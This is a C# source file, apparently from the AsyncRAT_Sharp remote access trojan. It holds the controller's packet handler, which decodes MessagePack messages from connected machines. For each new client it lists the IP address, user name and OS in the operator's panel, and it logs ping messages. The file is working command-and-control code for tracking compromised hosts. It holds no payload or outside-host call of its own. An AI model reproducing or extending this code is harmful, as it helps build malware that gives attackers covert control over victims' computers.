using AsyncRAT_Sharp.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using System;
using System.Diagnostics;

namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandlePacket
    {
        public static void Read(Clients client, byte[] data)
        {
            try
            {
                    MsgPack unpack_msgpack = new MsgPack();
                    unpack_msgpack.DecodeFromBytes(data);
                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                    {
                        case "ClientInfo":
                        if (Program.form1.listView1.InvokeRequired)
                        {
                            Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                client.LV = new ListViewItem();
                                client.LV.Tag = client;
                                client.LV.Text = string.Concat(client.Client.RemoteEndPoint.ToString());
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                Program.form1.listView1.Items.Insert(0, client.LV);
                            }));
                        }
                            break;

                        case "Ping":
                            {
                                Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                            }
                            break;
                    }              
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}